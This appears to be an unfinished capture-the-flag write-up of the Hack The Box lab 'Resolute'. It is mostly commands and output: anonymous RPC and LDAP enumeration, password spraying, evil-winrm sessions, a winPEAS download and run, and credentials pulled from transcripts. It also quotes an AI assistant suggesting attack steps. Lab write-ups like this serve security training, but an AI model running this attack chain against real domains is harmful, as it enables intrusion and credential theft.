# Report - Resolute - HTB

- Author: Henry Post
- Target: Resolute
- Target IP: 10.129.96.155
- Attacker IP: 2.3.4.5
- Date: 07/16/2026

## Executive Summary



### Recommendations

1. a
2. b
3. c

## Resources

- resource1
- github link
- medium link
- exploit-db link

## Recon

Let's start with a service scan.

```sh
# service scan
nmap -Pn 10.129.96.155 -sV -sC -v -oN nmap_sVsC.txt
```

```text
# Nmap 7.99 scan initiated Thu Jul 16 17:30:20 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -sC -v -oN nmap_sVsC.txt 10.129.96.155
Nmap scan report for 10.129.96.155
Host is up (0.032s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-16 21:37:16Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-07-16T21:37:21
|_  start_date: 2026-07-16T20:00:09
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2026-07-16T14:37:23-07:00
|_clock-skew: mean: 2h26m48s, deviation: 4h02m32s, median: 6m46s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 16 17:30:41 2026 -- 1 IP address (1 host up) scanned in 20.94 seconds

```

So we've got Kerberos (DC), LDAP, some HTTP API at port 5985... And the domain name is `megabank.local`...

Let's start by visiting http://10.129.96.155:5985 . 404! Okay.

`dirb` time. (No results.)

```sh
netexec smb 10.129.96.155
# shows null auth is enabled.
```

Let's try `impacket-GetADUsers`.

```sh
impacket-GetADUsers megabank.local/ -dc-ip 10.129.96.155 -debug
# empty
```

Okay. Let's try to enumerate SMB shares next.

```sh
smbclient -L //10.129.96.155 -N
# empty
```

Let's try `smbmap`.

```sh
smbmap -H 10.129.96.155
# empty
```

Hm. Feeling like I'm running out of options...

```sh
crackmapexec smb 10.129.96.155 --shares
# fails

rpcclient -U "" -N 10.129.96.155
> enumdomusers

<<EOF
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
EOF

> enumdomgroups
<<EOF
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]
EOF


> querygroup 0x200
<<OWO
        Group Name:     Domain Admins
        Description:    Designated administrators of the domain
        Group Attribute:7
        Num Members:1
OWO

> querygroupmem 0x200
<<UWU
        rid:[0x1f4] attr:[0x7] (its administrator user btw)
UWU
```

Well, we have a list of users. But no passwords.

I'm feeling a bit stuck due to my lack of AD knowledge, so...time to cheat :)

Okay. I totally missed this. "Windapsearch".

> Let's check if LDAP anonymous binds are allowed and attempt to retrieve a list of users. To do this, we can use [Windapsearch](https://github.com/ropnop/windapsearch).

```sh
wget https://github.com/ropnop/go-windapsearch/releases/download/v0.3.0/windapsearch-linux-amd64

chmod +x ./windapsearch-linux-amd64

./windapsearch-linux-amd64 -d resolute.megabank.local --dc-ip 10.129.96.155 -U
# no results, fails with domain not found

./windapsearch-linux-amd64 -d resolute.megabank.local --dc-ip 10.129.96.155 -U --full | grep Password
# no LDAP servers found for domain: resolute.megabank.local

./windapsearch-linux-amd64 -d megabank.local --dc-ip 10.129.96.155 -U
# same


sudo bash -c 'echo "nameserver 10.129.96.155" > /etc/resolv.conf'
./windapsearch-linux-amd64 -d megabank.local --dc-ip 10.129.96.155 -U
```

Claude actually says...
> You already got full user list via rpcclient — worth moving to ASREPRoast now instead of fighting LDAP tools:

Sweet. Let's make `users.txt`

```sh
echo "Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki" > users.txt

impacket-GetNPUsers megabank.local/ -dc-ip 10.129.96.155 -usersfile users.txt -no-pass -format hashcat
```

> Check LDAP user descriptions for cleartext creds/hints — common on this style box:

Ok claude.
## Non-root access



```sh
ldapsearch -x -H ldap://10.129.96.155 -D '' -w '' -b "dc=megabank,dc=local" "(objectClass=user)" sAMAccountName description

#Bingo.
<<OWO
# Marko Novak, Employees, MegaBank Users, megabank.local
dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
description: Account created. Password set to Welcome123!
sAMAccountName: marko

OWO
```

Bingo.

```sh
netexec smb 10.129.96.155 -u marko -p 'Welcome123!'
#fails
```

Let's spray.

```sh
netexec smb 10.129.96.155 -u users.txt -p 'Welcome123!' --continue-on-success
#SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 

# Success: `melanie:Welcome123!`
```

Checking melanie's shares...

```sh
netexec smb 10.129.96.155 -u melanie -p 'Welcome123!' --shares

<<EOF
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                  
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.96.155   445    RESOLUTE         [*] Enumerated shares
SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark                                                                                    
SMB         10.129.96.155   445    RESOLUTE         -----           -----------     ------                                                                                    
SMB         10.129.96.155   445    RESOLUTE         ADMIN$                          Remote Admin                                                                              
SMB         10.129.96.155   445    RESOLUTE         C$                              Default share                                                                             
SMB         10.129.96.155   445    RESOLUTE         IPC$            READ            Remote IPC                                                                                
SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share                                                                        
SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share                                                                        
EOF
```

Great stuff. I wonder how we can recursively list all the contents of the shares.

```sh
mkdir melanie-files/
cd melanie-files/
smbclient //10.129.96.155/SYSVOL -U megabank.local/melanie%'Welcome123!' -c 'recurse ON; prompt OFF; mget *'
```

> Only default GPT.INI/GptTmpl.inf, no Groups.xml (no GPP cpassword). Check GptTmpl.inf for privilege-assignment hints anyway, then pivot — SYSVOL dead end here.

Okay. Thanks Claude. Let's check that file.

```toml
��[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
SeAuditPrivilege = *S-1-5-20,*S-1-5-19
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
```

Dead end. Let's continue.

```sh
netexec winrm 10.129.96.155 -u melanie -p 'Welcome123!'
<<EOF
WINRM       10.129.96.155   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local) 
WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
EOF

# other 2 commands from claude
bloodhound-python -u melanie -p 'Welcome123!' -d megabank.local -ns 10.129.96.155 -c all
ls *.json
# ...then upload it to bloodhound...
# The only Domain Admin is 'administrator'...
# melanie is MemberOf:
<<OWO
- USERS@MEGABANK.LOCAL
- REMOTE MANAGEMENT USERS@MEGABANK.LOCAL
- DOMAIN USERS@MEGABANK.LOCAL
OWO

# might as well steal local blood
evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'


```

Now to try to steal some other info.

```sh
evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'

whoami /all
<<EOF

User Name        SID
================ ===============================================
megabank\melanie S-1-5-21-1392959593-3013219662-3596683436-10101


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

EOF

```

I just realized we didn't run `WinPEAS`.

```sh
wget https://github.com/peass-ng/PEASS-ng/releases/download/20260715-81d3c7f8/winPEASx64.exe

evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'

upload winPEASx64.exe

./winPEASx64.exe > winpeasoutput.txt

download winpeasoutput.txt

# (ctrl-F Autologon)
```

So, apparently we have AutoLogon creds. Let's try to dump them.

```sh
evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
# nope

type C:\Users\melanie\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# nope

dir C:\Users\ryan -Force
# nope

cmdkey /list
# nope

Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.xml,*.config,*.ps1,*.bat -ErrorAction SilentlyContinue | Select-String -Pattern password
# nope

rm winpeasoutput.txt
.\winPEASx64.exe fileanalysis
# nothing interesting...

net user melanie /domain
<<OWO
User name                    melanie
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/16/2026 5:11:04 PM
Password expires             Never
Password changeable          7/17/2026 5:11:04 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

OWO
# not really useful...

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

<<OWO
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x52f5ad71
    ShutdownFlags    REG_DWORD    0x80000033
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultDomainName    REG_SZ    MEGABANK
    DefaultUserName    REG_SZ    Administrator
    AutoAdminLogon    REG_SZ    1
    AutoLogonSID    REG_SZ    S-1-5-21-1392959593-3013219662-3596683436-500
    LastUsedUsername    REG_SZ    Administrator

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions

OWO
```

I'm going to consult the guide because we went on way too many rabbit holes.

...Oh my god. It was so much simpler.

`C:\PSTranscripts\20191203\`.

```sh
evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'

cd C:\

dir -force

# ...

cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

```

We have `ryan` user creds.

```sh

evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
```


## Root access



## Proof

### Local proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat local.txt`
(IMG_PLACEHOLDER)
![](Pasted%20image%2020260716181423.png)
### Root proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat proof.txt`
(IMG_PLACEHOLDER)
